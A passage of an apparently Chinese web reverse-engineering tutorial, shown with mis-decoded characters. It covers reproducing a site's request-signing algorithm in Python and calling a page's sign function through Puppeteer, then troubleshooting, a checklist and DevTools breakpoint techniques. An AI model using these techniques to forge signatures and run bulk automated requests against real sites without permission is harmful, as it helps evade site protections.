    <span class="n">sorted_params</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">items</span><span class="p">())</span>
    <span class="n">param_str</span> <span class="o">=</span> <span class="s1">&#39;&amp;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">sorted_params</span><span class="p">])</span>
    <span class="n">sign_str</span> <span class="o">=</span> <span class="n">param_str</span> <span class="o">+</span> <span class="s1">&#39;secret_salt&#39;</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">sign_str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span>
    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;123456&#39;</span><span class="p">,</span>
    <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
<span class="p">}</span>

<span class="n">params</span><span class="p">[</span><span class="s1">&#39;sign&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="æ–¹æ¡ˆä¸‰rpc-è°ƒç”¨æµè§ˆå™¨">æ–¹æ¡ˆä¸‰ï¼šRPC è°ƒç”¨æµè§ˆå™¨</h3>

      <p><strong>é€‚ç”¨åœºæ™¯</strong>: ç®—æ³•ä¾èµ–æµè§ˆå™¨ç¯å¢ƒï¼ˆCanvas æŒ‡çº¹ã€WebGL ç­‰ï¼‰</p>

      <p><strong>å·¥å…·</strong>: Puppeteer / Selenium</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Puppeteer</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">);</span>

<span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://target.com&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">sign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// è°ƒç”¨ç½‘é¡µä¸­çš„åŠ å¯†å‡½æ•°</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">generateSign</span><span class="p">({</span><span class="nx">user</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">});</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Sign:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">sign</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é˜¶æ®µä¸ƒæµ‹è¯•ä¸éªŒè¯">é˜¶æ®µä¸ƒï¼šæµ‹è¯•ä¸éªŒè¯</h2>

      <h3 id="1-å•å…ƒæµ‹è¯•">1. å•å…ƒæµ‹è¯•</h3>

      <p>ç¡®ä¿æå–çš„ç®—æ³•è¾“å‡ºä¸æµè§ˆå™¨ä¸€è‡´ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">unittest</span>

<span class="k">class</span><span class="w"> </span><span class="nc">TestSignGeneration</span><span class="p">(</span><span class="n">unittest</span><span class="o">.</span><span class="n">TestCase</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">test_sign</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="s1">&#39;test&#39;</span><span class="p">,</span> <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="mi">1234567890</span><span class="p">}</span>
        <span class="n">sign</span> <span class="o">=</span> <span class="n">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>
        <span class="c1"># ä¸æµè§ˆå™¨ä¸­ç”Ÿæˆçš„ç­¾åå¯¹æ¯”</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="n">sign</span><span class="p">,</span> <span class="s1">&#39;expected_sign_value&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="2-å®æˆ˜æµ‹è¯•">2. å®æˆ˜æµ‹è¯•</h3>

      <p>ä½¿ç”¨ç”Ÿæˆçš„å‚æ•°å‘é€å®é™…è¯·æ±‚ï¼ŒéªŒè¯æœåŠ¡å™¨å“åº”ã€‚</p>

      <hr />

      <h2 id="å¸¸è§é™·é˜±">å¸¸è§é™·é˜±</h2>

      <h3 id="1-æ—¶é—´æˆ³åŒæ­¥é—®é¢˜">1. æ—¶é—´æˆ³åŒæ­¥é—®é¢˜</h3>

      <ul>
        <li><strong>ç°è±¡</strong>: ç­¾åæ­£ç¡®ï¼Œä½†æœåŠ¡å™¨è¿”å›"ç­¾åè¿‡æœŸ&#8221;</li>
        <li><strong>åŸå› </strong>: æœåŠ¡å™¨æ ¡éªŒæ—¶é—´æˆ³ï¼Œè¦æ±‚ä¸æœåŠ¡å™¨æ—¶é—´è¯¯å·®åœ¨å‡ ç§’å†…</li>
        <li><strong>è§£å†³</strong>: ä½¿ç”¨æœåŠ¡å™¨æ—¶é—´æˆ– NTP åŒæ­¥</li>
      </ul>

      <h3 id="2-nonce-å”¯ä¸€æ€§">2. Nonce å”¯ä¸€æ€§</h3>

      <ul>
        <li><strong>ç°è±¡</strong>: é‡æ”¾è¯·æ±‚å¤±è´¥</li>
        <li><strong>åŸå› </strong>: Nonceï¼ˆéšæœºæ•°ï¼‰è¢«æœåŠ¡å™¨è®°å½•ï¼Œé‡å¤ä½¿ç”¨ä¼šè¢«æ‹’ç»</li>
        <li><strong>è§£å†³</strong>: æ¯æ¬¡è¯·æ±‚ç”Ÿæˆæ–°çš„ UUID</li>
      </ul>

      <h3 id="3-ç¯å¢ƒä¾èµ–">3. ç¯å¢ƒä¾èµ–</h3>

      <ul>
        <li><strong>ç°è±¡</strong>: æ‰£ä¸‹çš„ JS ä»£ç åœ¨ Node.js ä¸­æŠ¥é”™</li>
        <li><strong>åŸå› </strong>: ä»£ç ä¾èµ–æµè§ˆå™¨å…¨å±€å¯¹è±¡ï¼ˆwindow, document, navigatorï¼‰</li>
        <li><strong>è§£å†³</strong>: Mock è¿™äº›å¯¹è±¡ï¼Œæˆ–ä½¿ç”¨ jsdom</li>
      </ul>

      <hr />

      <h2 id="éªŒè¯æ¸…å•">âœ… éªŒè¯æ¸…å•</h2>

      <p>å®Œæˆä»¥ä¸‹æ£€æŸ¥ç¡®ä¿é€†å‘æˆåŠŸï¼š</p>

      <h3 id="é˜¶æ®µéªŒè¯">é˜¶æ®µéªŒè¯</h3>

      <ul>
        <li>
          <p><input type="checkbox" class="task-list-item-checkbox" disabled> <strong>ä¿¡æ¯æ”¶é›†å®Œæˆ</strong></p>

          <ul>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> è¯†åˆ«äº†æŠ€æœ¯æ ˆå’Œæ¡†æ¶</li>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> æšä¸¾äº†æ‰€æœ‰å…³é”®èµ„æº</li>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> è®°å½•äº†ç›®æ ‡åŠŸèƒ½</li>
          </ul>
        </li>
        <li>
          <p><input type="checkbox" class="task-list-item-checkbox" disabled> <strong>æµé‡åˆ†æå®Œæˆ</strong></p>

          <ul>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> æ•è·äº†å…³é”®è¯·æ±‚</li>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> è¯†åˆ«äº†ç­¾å/åŠ å¯†å‚æ•°</li>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> åˆ†æäº†è¯·æ±‚å¤´å’Œå“åº”</li>
          </ul>
        </li>
        <li>
          <p><input type="checkbox" class="task-list-item-checkbox" disabled> <strong>ä»£ç å®šä½å®Œæˆ</strong></p>

          <ul>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> æ‰¾åˆ°äº†åŠ å¯†/ç­¾åå‡½æ•°</li>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> ç†è§£äº†å‚æ•°ç”Ÿæˆé€»è¾‘</li>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> è¯†åˆ«äº†ç®—æ³•ç±»å‹</li>
          </ul>
        </li>
        <li>
          <p><input type="checkbox" class="task-list-item-checkbox" disabled> <strong>åŠ¨æ€è°ƒè¯•å®Œæˆ</strong></p>

          <ul>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> æˆåŠŸè®¾ç½®æ–­ç‚¹</li>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> è¿½è¸ªäº†å®Œæ•´è°ƒç”¨é“¾</li>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> æå–äº†å…³é”®å‚æ•°</li>
          </ul>
        </li>
        <li>
          <p><input type="checkbox" class="task-list-item-checkbox" disabled> <strong>è‡ªåŠ¨åŒ–å®ç°å®Œæˆ</strong></p>

          <ul>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> ç¼–å†™äº†å¤ç°ä»£ç </li>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> æµ‹è¯•è¾“å‡ºä¸æµè§ˆå™¨ä¸€è‡´</li>
            <li><input type="checkbox" class="task-list-item-checkbox" disabled> å®é™…è¯·æ±‚æˆåŠŸ</li>
          </ul>
        </li>
      </ul>

      <hr />

      <h2 id="æ•…éšœæ’é™¤">ğŸ”§ æ•…éšœæ’é™¤</h2>

      <h3 id="é—®é¢˜æ‰¾ä¸åˆ°å…³é”®ä»£ç ">é—®é¢˜ï¼šæ‰¾ä¸åˆ°å…³é”®ä»£ç </h3>

      <p><strong>ç—‡çŠ¶</strong>: æœç´¢åŠ å¯†å…³é”®è¯æ— ç»“æœ</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <ol>
        <li>å°è¯•æœç´¢å‡½æ•°è°ƒç”¨æ¨¡å¼: <code>CryptoJS</code>, <code>btoa</code>, <code>atob</code></li>
        <li>ä» Network Initiator åå‘è¿½è¸ª</li>
        <li>æŸ¥æ‰¾æ··æ·†åçš„å˜é‡åæ¨¡å¼: <code>_0x</code>, <code>__</code></li>
        <li>ä½¿ç”¨ XHR æ–­ç‚¹è‡ªåŠ¨æ‹¦æˆª</li>
      </ol>

      <h3 id="é—®é¢˜æ‰£ä¸‹çš„-js-ä»£ç æ— æ³•è¿è¡Œ">é—®é¢˜ï¼šæ‰£ä¸‹çš„ JS ä»£ç æ— æ³•è¿è¡Œ</h3>

      <p><strong>ç—‡çŠ¶</strong>: <code>ReferenceError: window is not defined</code></p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Node.js ä¸­ Mock æµè§ˆå™¨å¯¹è±¡</span>
<span class="nb">global</span><span class="p">.</span><span class="nb">window</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">global</span><span class="p">;</span>
<span class="nb">global</span><span class="p">.</span><span class="nb">document</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
<span class="nb">global</span><span class="p">.</span><span class="nx">navigator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">userAgent</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Mozilla/5.0...&#39;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h3 id="é—®é¢˜ç­¾åéªŒè¯å¤±è´¥">é—®é¢˜ï¼šç­¾åéªŒè¯å¤±è´¥</h3>

      <p><strong>ç—‡çŠ¶</strong>: æœåŠ¡å™¨è¿”å› &#8220;Invalid signature&#8221;</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <ol>
        <li>æ£€æŸ¥å‚æ•°æ’åºæ˜¯å¦æ­£ç¡®</li>
        <li>æ£€æŸ¥ç¼–ç æ ¼å¼ (UTF-8 vs GBK)</li>
        <li>æ£€æŸ¥æ—¶é—´æˆ³ç²¾åº¦ (ç§’ vs æ¯«ç§’)</li>
        <li>æ£€æŸ¥æ˜¯å¦ç¼ºå°‘éšè—å‚æ•°</li>
        <li>ä½¿ç”¨ diff å·¥å…·å¯¹æ¯”æµè§ˆå™¨å’Œä»£ç çš„è¾“å‡º</li>
      </ol>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">ğŸ’¡ æœ€ä½³å®è·µ</h2>

      <h3 id="1-åˆ†é˜¶æ®µè®°å½•">1. åˆ†é˜¶æ®µè®°å½•</h3>

      <p>ä¸ºæ¯ä¸ªé˜¶æ®µåˆ›å»ºç¬”è®°æ–‡ä»¶ï¼š</p>

      <pre><code>analysis/
â”œâ”€â”€ 01-recon.md         # ä¿¡æ¯æ”¶é›†è®°å½•
â”œâ”€â”€ 02-traffic.md       # æµé‡åˆ†æ
â”œâ”€â”€ 03-code.md          # ä»£ç å®šä½
â”œâ”€â”€ 04-algorithm.md     # ç®—æ³•åˆ†æ
â””â”€â”€ 05-implementation.md # å®ç°æ–¹æ¡ˆ
</code></pre>

      <h3 id="2-ç‰ˆæœ¬æ§åˆ¶">2. ç‰ˆæœ¬æ§åˆ¶</h3>

      <div class="codehilite">
        <pre><span></span><code>git<span class="w"> </span>init
git<span class="w"> </span>add<span class="w"> </span>.
git<span class="w"> </span>commit<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;Initial analysis&quot;</span>

<span class="c1"># æ¯ä¸ªé˜¶æ®µæäº¤</span>
git<span class="w"> </span>commit<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;Phase 1: Recon completed&quot;</span>
</code></pre>
      </div>

      <h3 id="3-æµ‹è¯•é©±åŠ¨">3. æµ‹è¯•é©±åŠ¨</h3>

      <p>å…ˆå†™æµ‹è¯•ç”¨ä¾‹ï¼Œå†å®ç°ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">test_sign_generation</span><span class="p">():</span>
    <span class="c1"># ä»æµè§ˆå™¨è·å–çš„å·²çŸ¥å€¼</span>
    <span class="n">expected</span> <span class="o">=</span> <span class="s2">&quot;abc123def456&quot;</span>
    <span class="n">actual</span> <span class="o">=</span> <span class="n">generate_sign</span><span class="p">(</span><span class="n">test_params</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">actual</span> <span class="o">==</span> <span class="n">expected</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ€»ç»“">ğŸ“Š æ€»ç»“</h2>

      <p>Web é€†å‘å·¥ç¨‹æ˜¯ä¸€ä¸ªå¾ªç¯è¿­ä»£çš„è¿‡ç¨‹ï¼š</p>

      <pre><code>ä¿¡æ¯æ”¶é›† -&gt; æµé‡åˆ†æ -&gt; é™æ€åˆ†æ -&gt; åŠ¨æ€è°ƒè¯• -&gt; é€»è¾‘è¿˜åŸ -&gt; è‡ªåŠ¨åŒ– -&gt; æµ‹è¯• -&gt; (å¾ªç¯)
</code></pre>

      <p><strong>æ ¸å¿ƒåŸåˆ™</strong>:</p>

      <ol>
        <li><strong>é€å±‚æ·±å…¥</strong>: ä»å¤–åˆ°å†…ï¼Œå…ˆäº†è§£æ•´ä½“å†é’»ç ”ç»†èŠ‚</li>
        <li><strong>å·¥å…·ç»„åˆ</strong>: DevTools + Burp Suite + Python</li>
        <li><strong>è®°å½•æ–‡æ¡£</strong>: è®°å½•å…³é”®å‘ç°ï¼Œä¾¿äºåç»­å‚è€ƒ</li>
        <li><strong>æµ‹è¯•éªŒè¯</strong>: æ¯ä¸ªé˜¶æ®µéƒ½è¦éªŒè¯æ­£ç¡®æ€§</li>
      </ol>

      <p><strong>æˆåŠŸæ ‡å¿—</strong>:</p>

      <ul>
        <li>âœ… èƒ½å¤Ÿç¨³å®šå¤ç°ç›®æ ‡åŠŸèƒ½</li>
        <li>âœ… ä»£ç è¾“å‡ºä¸æµè§ˆå™¨å®Œå…¨ä¸€è‡´</li>
        <li>âœ… ç†è§£å®Œæ•´çš„åŠ å¯†/ç­¾åæµç¨‹</li>
        <li>âœ… å¯ä»¥æ‰¹é‡è‡ªåŠ¨åŒ–æ‰§è¡Œ</li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ”— ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
        <li><a href="#03-Basic-Recipes-api-reverse-engineering">API æ¥å£é€†å‘</a></li>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="#03-Basic-Recipes-crypto-identification">åŠ å¯†ç®—æ³•è¯†åˆ«</a></li>
        <li><a href="#03-Basic-Recipes-hooking-techniques">Hook æŠ€å·§</a></li>
      </ul>

    </div>

    <div class="section" id="03-Basic-Recipes-debugging-techniques">
      <h2>26. Debugging Techniques</h2>
      <h1 id="è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>è°ƒè¯•æ˜¯é€†å‘å·¥ç¨‹çš„æ ¸å¿ƒæŠ€èƒ½ã€‚æŒæ¡é«˜çº§è°ƒè¯•æŠ€å·§å¯ä»¥å¤§å¹…æå‡é€†å‘æ•ˆç‡ï¼Œå¿«é€Ÿå®šä½å…³é”®ä»£ç ï¼Œç†è§£ç¨‹åºé€»è¾‘ã€‚</p>

      <hr />

      <h2 id="æ–­ç‚¹ç±»å‹">æ–­ç‚¹ç±»å‹</h2>

      <h3 id="1-è¡Œæ–­ç‚¹-line-breakpoint">1. è¡Œæ–­ç‚¹ (Line Breakpoint)</h3>

      <p>æœ€åŸºæœ¬çš„æ–­ç‚¹ç±»å‹ï¼Œç‚¹å‡»è¡Œå·å³å¯è®¾ç½®ã€‚</p>

      <p><strong>å¿«æ·é”®</strong>:</p>

      <ul>
        <li>è®¾ç½®/å–æ¶ˆæ–­ç‚¹: ç‚¹å‡»è¡Œå·</li>
        <li>ç¦ç”¨æ‰€æœ‰æ–­ç‚¹: <code>Ctrl+F8</code> (Windows) / <code>Cmd+F8</code> (Mac)</li>
      </ul>

      <p><strong>æŠ€å·§</strong>:</p>

      <ul>
        <li>åœ¨å‡½æ•°å…¥å£è®¾ç½®æ–­ç‚¹</li>
        <li>åœ¨å¯ç–‘çš„åŠ å¯†ã€ç­¾åå‡½æ•°å¤„è®¾ç½®</li>
      </ul>

      <h3 id="2-æ¡ä»¶æ–­ç‚¹-conditional-breakpoint">2. æ¡ä»¶æ–­ç‚¹ (Conditional Breakpoint)</h3>

      <p>åªæœ‰æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶æ‰è§¦å‘çš„æ–­ç‚¹ã€‚</p>

      <p><strong>è®¾ç½®æ–¹æ³•</strong>:</p>

      <ol>
        <li>å³é”®è¡Œå·</li>
        <li>é€‰æ‹© &#8220;Add conditional breakpoint&#8221;</li>
        <li>è¾“å…¥æ¡ä»¶è¡¨è¾¾å¼</li>
      </ol>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åªæœ‰å½“ user_id ä¸º 12345 æ—¶æ‰æ–­ç‚¹</span>
<span class="nx">user_id</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">12345</span>

<span class="c1">// åªæœ‰å½“å‚æ•°åŒ…å« &#39;admin&#39; æ—¶æ‰æ–­ç‚¹</span>
<span class="nx">params</span><span class="p">.</span><span class="nx">username</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span>

<span class="c1">// å¾ªç¯ä¸­æ¯ 100 æ¬¡æ‰æ–­ç‚¹</span>
<span class="nx">i</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">0</span>
</code></pre>
      </div>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>:</p>

      <ul>
        <li>å¤§é‡å¾ªç¯ä¸­å®šä½ç‰¹å®šæ•°æ®</li>
        <li>å¤šæ¬¡è°ƒç”¨çš„å‡½æ•°ä¸­å®šä½ç‰¹å®šå‚æ•°</li>
      </ul>

      <h3 id="3-æ—¥å¿—ç‚¹-logpoint">3. æ—¥å¿—ç‚¹ (Logpoint)</h3>

      <p>ä¸æš‚åœæ‰§è¡Œï¼Œåªè¾“å‡ºæ—¥å¿—ã€‚</p>

      <p><strong>è®¾ç½®æ–¹æ³•</strong>:</p>

      <ol>
        <li>å³é”®è¡Œå·</li>
        <li>é€‰æ‹© &#8220;Add logpoint&#8221;</li>
        <li>è¾“å…¥è¦è¾“å‡ºçš„è¡¨è¾¾å¼</li>
      </ol>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è¾“å‡ºå˜é‡å€¼</span>
<span class="s1">&#39;User ID:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">user_id</span>

<span class="c1">// è¾“å‡ºå¯¹è±¡</span>
<span class="s1">&#39;Params:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">params</span>

<span class="c1">// è¾“å‡ºå‡½æ•°è¿”å›å€¼</span>
<span class="s1">&#39;Result:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">calculateSign</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>ä¸å½±å“ä»£ç æ‰§è¡Œæµç¨‹</li>
        <li>é€‚åˆè¿½è¸ªå˜é‡å˜åŒ–</li>
        <li>æ¯”æ’å…¥ console.log æ›´æ–¹ä¾¿</li>
      </ul>

      <h3 id="4-dom-æ–­ç‚¹-dom-breakpoint">4. DOM æ–­ç‚¹ (DOM Breakpoint)</h3>

      <p>ç›‘æ§ DOM å˜åŒ–ã€‚</p>

      <p><strong>ç±»å‹</strong>:</p>

      <ul>
        <li><strong>Subtree modifications</strong>: å­èŠ‚ç‚¹å˜åŒ–</li>
        <li><strong>Attribute modifications</strong>: å±æ€§å˜åŒ–</li>
        <li><strong>Node removal</strong>: èŠ‚ç‚¹ç§»é™¤</li>
      </ul>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>:</p>

      <ul>
        <li>è¿½è¸ªåŠ¨æ€ç”Ÿæˆçš„éªŒè¯ç å›¾ç‰‡</li>
        <li>è¿½è¸ªä»·æ ¼æ•°æ®çš„åŠ¨æ€æ›´æ–°</li>
        <li>è¿½è¸ªè¡¨å•çš„è‡ªåŠ¨å¡«å……</li>
      </ul>

      <p><strong>è®¾ç½®æ–¹æ³•</strong>:</p>

      <ol>
        <li>Elements é¢æ¿é€‰ä¸­å…ƒç´ </li>
        <li>å³é”® -> Break on</li>
        <li>é€‰æ‹©æ–­ç‚¹ç±»å‹</li>
      </ol>

      <h3 id="5-xhrfetch-æ–­ç‚¹">5. XHR/Fetch æ–­ç‚¹</h3>

      <p>åœ¨ç½‘ç»œè¯·æ±‚å‘é€æ—¶è§¦å‘æ–­ç‚¹ã€‚</p>

      <p><strong>è®¾ç½®æ–¹æ³•</strong>:</p>

      <ol>
        <li>Sources é¢æ¿</li>
        <li>å³ä¾§ &#8220;XHR/fetch Breakpoints&#8221;</li>
        <li>è¾“å…¥ URL å…³é”®è¯</li>
      </ol>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <pre><code>/api/login
/api/user/info
sign
token
</code></pre>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>:</p>

      <ul>
        <li>å¿«é€Ÿå®šä½ API è°ƒç”¨ä»£ç </li>
        <li>è¿½è¸ªè¯·æ±‚å‚æ•°ç”Ÿæˆé€»è¾‘</li>
      </ul>

      <h3 id="6-äº‹ä»¶æ–­ç‚¹-event-listener-breakpoint">6. äº‹ä»¶æ–­ç‚¹ (Event Listener Breakpoint)</h3>

      <p>åœ¨ç‰¹å®šäº‹ä»¶è§¦å‘æ—¶æ–­ç‚¹ã€‚</p>

      <p><strong>å¸¸ç”¨äº‹ä»¶</strong>:</p>

      <ul>
        <li>Mouse -> click</li>
        <li>Mouse -> mousedown/mouseup</li>
        <li>Keyboard -> keydown/keyup</li>
        <li>Form -> submit</li>
        <li>Timer -> setTimeout/setInterval</li>
      </ul>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>:</p>

      <ul>
        <li>ä¸çŸ¥é“ç‚¹å‡»äº‹ä»¶ç»‘å®šåœ¨å“ªé‡Œ</li>
        <li>è¿½è¸ªè¡¨å•æäº¤é€»è¾‘</li>
        <li>è¿½è¸ªå®šæ—¶å™¨ä¸­çš„åè°ƒè¯•ä»£ç </li>
      </ul>

      <hr />

      <h2 id="å•æ­¥æ‰§è¡Œ">å•æ­¥æ‰§è¡Œ</h2>

      <h3 id="å¿«æ·é”®">å¿«æ·é”®</h3>

      <table>
        <thead>
          <tr>
            <th>æ“ä½œ</th>
            <th>Windows/Linux</th>
            <th>Mac</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Step Over</strong></td>
            <td><code>F10</code></td>
            <td><code>F10</code></td>
            <td>è·³è¿‡å‡½æ•°ï¼Œæ‰§è¡Œä¸‹ä¸€è¡Œ</td>
          </tr>
          <tr>
            <td><strong>Step Into</strong></td>
            <td><code>F11</code></td>
            <td><code>F11</code></td>
            <td>è¿›å…¥å‡½æ•°å†…éƒ¨</td>
          </tr>
          <tr>
            <td><strong>Step Out</strong></td>
            <td><code>Shift+F11</code></td>
            <td><code>Shift+F11</code></td>
            <td>è·³å‡ºå½“å‰å‡½æ•°</td>
          </tr>
          <tr>
            <td><strong>Continue</strong></td>
            <td><code>F8</code></td>
            <td><code>F8</code></td>
            <td>ç»§ç»­æ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹</td>
          </tr>
          <tr>
            <td><strong>Resume</strong></td>
            <td><code>F8</code></td>
            <td><code>F8</code></td>
            <td>æ¢å¤è„šæœ¬æ‰§è¡Œ</td>
          </tr>
        </tbody>
      </table>

      <h3 id="ä½¿ç”¨æŠ€å·§">ä½¿ç”¨æŠ€å·§</h3>

      <p><strong>Step Over vs Step Into</strong>:</p>

      <ul>
        <li>å¦‚æœä¸‹ä¸€è¡Œæ˜¯åº“å‡½æ•°ï¼ˆå¦‚ <code>JSON.stringify</code>ï¼‰ï¼Œç”¨ <strong>Step Over</strong></li>
        <li>å¦‚æœä¸‹ä¸€è¡Œæ˜¯ä¸šåŠ¡å‡½æ•°ï¼ˆå¦‚ <code>generateSign</code>ï¼‰ï¼Œç”¨ <strong>Step Into</strong></li>
      </ul>

      <p><strong>Step Out</strong>:</p>

      <ul>
        <li>è¿›é”™å‡½æ•°äº†ï¼Ÿç”¨ <strong>Step Out</strong> å¿«é€Ÿè¿”å›</li>
      </ul>

      <p><strong>Continue</strong>:</p>

      <ul>
        <li>å¾ªç¯ä¸­ä¸æƒ³ä¸€æ­¥æ­¥æ‰§è¡Œï¼Ÿåœ¨å¾ªç¯åè®¾ç½®æ–­ç‚¹ï¼Œç”¨ <strong>Continue</strong> è·³è¿‡</li>
      </ul>

      <hr />

      <h2 id="è°ƒç”¨æ ˆåˆ†æ-call-stack">è°ƒç”¨æ ˆåˆ†æ (Call Stack)</h2>

      <h3 id="æŸ¥çœ‹è°ƒç”¨æ ˆ">æŸ¥çœ‹è°ƒç”¨æ ˆ</h3>

